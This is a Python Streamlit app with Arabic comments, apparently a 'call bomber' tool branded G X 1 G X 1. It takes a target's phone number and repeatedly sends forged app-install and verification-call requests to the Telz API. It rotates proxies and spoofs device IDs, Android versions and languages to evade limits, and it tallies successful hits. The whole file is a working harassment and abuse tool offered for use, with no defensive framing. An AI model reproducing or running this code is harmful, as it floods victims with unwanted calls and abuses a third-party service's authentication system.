import streamlit as st
import subprocess
import sys
import random
import time
import uuid
import string
import json
import requests
from termcolor import colored
import pyfiglet
import webbrowser
import os
from concurrent.futures import ThreadPoolExecutor

# إعداد واجهة المتصفح
st.set_page_config(page_title="G X 1 G X 1 - Browser Tool", page_icon="🌐", layout="wide")

# تصميم CSS مخصص لواجهة احترافية
st.markdown("""
    <style>
    .main { background-color: #0e1117; color: white; }
    .stTextInput>div>div>input { background-color: #262730; color: white; border-color: #4b4b4b; }
    .stButton>button { width: 100%; background-color: #007bff; color: white; border-radius: 8px; height: 3em; font-weight: bold; }
    .stButton>button:hover { background-color: #0056b3; border-color: white; }
    .stats-box { padding: 20px; border-radius: 10px; background-color: #1e1e26; border: 1px solid #3e3e4a; text-align: center; }
    .success-text { color: #2ecc71; font-size: 24px; font-weight: bold; }
    .error-text { color: #e74c3c; font-size: 24px; font-weight: bold; }
    </style>
    """, unsafe_allow_html=True)

# --- منطق الكود الأصلي بالكامل بدون أي تعديل أو اختصار ---

def generate_unique_ids():
    timestamp = int(time.time() * 1000)
    random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    unique_uuid = uuid.uuid4()
    return timestamp, random_id, unique_uuid

def load_proxies(filename="gx1gx1.txt"):
    proxies = []
    try:
        if os.path.exists(filename):
            with open(filename, "r") as f:
                lines = f.read().splitlines()
                for line in lines:
                    if line.strip():
                        proxies.append(line.strip())
    except Exception:
        pass
    return proxies

def get_random_proxy(proxies):
    if not proxies: return None
    proxy = random.choice(proxies)
    if proxy.startswith("socks5://") or proxy.startswith("socks4://"):
        return {"http": proxy, "https": proxy}
    else:
        if not proxy.startswith("http://") and not proxy.startswith("https://"):
            proxy = "http://" + proxy
        return {"http": proxy, "https": proxy}

# قائمة اللغات كاملة بدون أي اختصار (كما في طلبك)
foreign_langs = [
    "en", "fr", "de", "tr", "es", "pt", "it", "ko", "ru", "ja", "zh", "fa", "pl", "uk",
    "ar", "hi", "bn", "id", "ms", "vi", "th", "nl", "sv", "no", "da", "fi", "el", "cs", "hu",
    "ro", "sk", "sl", "sr", "hr", "lt", "lv", "et", "he", "ur", "ta", "te", "ml", "kn", "gu",
    "pa", "mr", "ne", "si", "my", "km", "lo", "am", "sw", "zu", "xh", "ig", "yo", "ha", "af",
    "eu", "gl", "ca", "is", "mk", "bs", "mt", "hy", "ka", "az", "kk", "uz", "mn", "tg", "tk",
    "ky", "ps", "ku", "ug", "sd", "lb", "sq", "be", "bg", "mo", "tt", "cv", "os", "fo", "sm",
    "fj", "to", "rw", "rn", "ny", "ss", "tn", "ts", "st", "ve", "wo", "ln", "kg", "ace", "ady",
    "ain", "akk", "als", "an", "ang", "arq", "arz", "ast", "av", "awa", "ay", "ba", "bal", "bar",
    "bcl", "ber", "bho", "bi", "bjn", "bm", "bo", "bpy", "br", "bsq", "bug", "bxr", "ceb", "ch",
    "cho", "chr", "chy", "ckb", "co", "cr", "crh", "csb", "cu", "cv", "cy", "dak", "dsb", "dv",
    "dz", "ee", "efi", "egy", "elx", "eml", "eo", "es-419", "et", "ext", "ff", "fit", "fj", "fo",
    "frp", "frr", "fur", "fy", "ga", "gaa", "gag", "gan", "gd", "gez", "glk", "gn", "gom", "got",
    "grc", "gsw", "gv", "hak", "haw", "hif", "ho", "hsb", "ht", "hz", "ia", "ie", "ik", "ilo",
    "inh", "io", "jam", "jbo", "jv", "kaa", "kab", "kbd", "kcg", "ki", "kj", "kl", "koi", "kr",
    "krl", "ksh", "kv", "kw", "la", "lad", "lam", "lb", "lez", "li", "lij", "lmo", "ln", "loz",
    "lrc", "ltg", "lv", "mad", "map", "mas", "mdf", "mg", "mh", "min", "mk", "ml", "mn", "mnc",
    "mni", "mos", "mrj", "ms", "mt", "mwl", "myv", "na", "nah", "nap", "nds", "ng", "niu", "nn",
    "no", "nov", "nrm", "nso", "nv", "ny", "nyn", "oc", "om", "or", "os", "pa", "pag", "pam",
    "pap", "pcd", "pdc", "pdt", "pfl", "pi", "pih", "pl", "pms", "pnb", "pnt", "prg", "qu", "qug",
    "raj", "rap", "rgn", "rif", "rm", "rmy", "rn", "roa", "rup", "rw", "sa", "sah", "sc", "scn",
    "sco", "sd", "se", "sg", "sgs", "sh", "shi", "shn", "si", "simple", "sk", "sl", "sli", "sm",
    "sn", "so", "sq", "sr", "srn", "ss", "st", "stq", "su", "sv", "sw", "syc", "szl", "ta", "te",
    "tet", "tg", "th", "ti", "tk", "tl", "tn", "to", "tpi", "tr", "ts", "tt", "tum", "tw", "ty",
    "udm", "ug", "uk", "ur", "uz", "ve", "vec", "vep", "vi", "vls", "vo", "wa", "war", "wo",
    "wuu", "xal", "xh", "xmf", "yi", "yo", "yue", "za", "zea", "zh", "zh-classical", "zh-min-nan",
    "zh-yue", "zu"
]

# --- إعدادات الجلسة (Session State) للحفاظ على البيانات في المتصفح ---
if "ok" not in st.session_state: st.session_state.ok = 0
if "error" not in st.session_state: st.session_state.error = 0
if "running" not in st.session_state: st.session_state.running = False

def main():
    # عرض الـ ASCII Art في المتصفح
    ascii_banner = pyfiglet.figlet_format("G X 1 G X 1", font="slant")
    st.code(ascii_banner, language='text')

    st.title("🌐 نظام التشغيل الذكي - واجهة المتصفح")
    st.markdown("---")

    # مدخلات المستخدم
    col1, col2 = st.columns(2)
    with col1:
        country_code = st.text_input("🌍 أدخل رمز الدولة (بدون +):", value="964")
    with col2:
        number = st.text_input("📱 أدخل الرقم بدون المقدمة:")

    # منطقة الأزرار
    col_btn1, col_btn2 = st.columns(2)
    with col_btn1:
        start_btn = st.button("🚀 بدء العملية")
    with col_btn2:
        stop_btn = st.button("🛑 إيقاف")

    if stop_btn:
        st.session_state.running = False
        st.warning("تم طلب الإيقاف...")

    # عرض الإحصائيات بشكل جميل
    st.markdown("### 📊 النتائج المباشرة")
    stats_placeholder = st.empty()

    # وظيفة العامل (Worker)
    def run_logic():
        proxies_list = load_proxies("gx1gx1.txt")
        install_url = "https://api.telz.com/app/install"
        auth_call_url = "https://api.telz.com/app/auth_call"
        headers = {'User-Agent': "Telz-Android/17.5.17", 'Content-Type': "application/json"}

        while st.session_state.running:
            foxx, fox, foxer = generate_unique_ids()
            random_android_version = str(random.randint(7, 14))
            random_lang = random.choice(foreign_langs)
            proxy = get_random_proxy(proxies_list)

            payload_install = json.dumps({
                "android_id": fox, "app_version": "17.5.17", "event": "install",
                "google_exists": "yes", "os": "android", "os_version": random_android_version,
                "play_market": True, "ts": foxx, "uuid": str(foxer)
            })

            try:
                # إرسال طلب التثبيت
                res_install = requests.post(install_url, data=payload_install, headers=headers, proxies=proxy, timeout=10)
                if res_install.ok and "ok" in res_install.text:
                    payload_auth_call = json.dumps({
                        "android_id": fox, "app_version": "17.5.17", "attempt": "0",
                        "event": "auth_call", "lang": random_lang, "os": "android",
                        "os_version": random_android_version, "phone": f"+{country_code}{number}",
                        "ts": foxx, "uuid": str(foxer)
                    })
                    # إرسال طلب الاتصال
                    res_auth = requests.post(auth_call_url, data=payload_auth_call, headers=headers, proxies=proxy, timeout=10)
                    if res_auth.ok and "ok" in res_auth.text:
                        st.session_state.ok += 1
                    else: st.session_state.error += 1
                else: st.session_state.error += 1
            except:
                st.session_state.error += 1

            # تحديث الواجهة فوراً
            stats_placeholder.markdown(f"""
                <div class="stats-box">
                    <span class="success-text">✓ Success: {st.session_state.ok}</span>
                    <br>
                    <span class="error-text">✘ Failed: {st.session_state.error}</span>
                </div>
            """, unsafe_allow_html=True)
            
            time.sleep(0.1) # لمنع تجميد المتصفح

    if start_btn and number:
        st.session_state.running = True
        st.success(f"بدء التشغيل للرقم: {country_code}{number}")
        run_logic()

    # القائمة الجانبية
    st.sidebar.image("https://img.icons8.com/clouds/100/000000/browser.png")
    st.sidebar.title("الإعدادات والمعلومات")
    st.sidebar.info("هذا التطبيق يعمل كمتصفح ويب (Streamlit) مع الحفاظ على الكود الأصلي بالكامل.")
    if st.sidebar.button("📢 فتح قناة التليجرام"):
        webbrowser.open('https://t.me/gx1gx1')

if __name__ == "__main__":
    main()
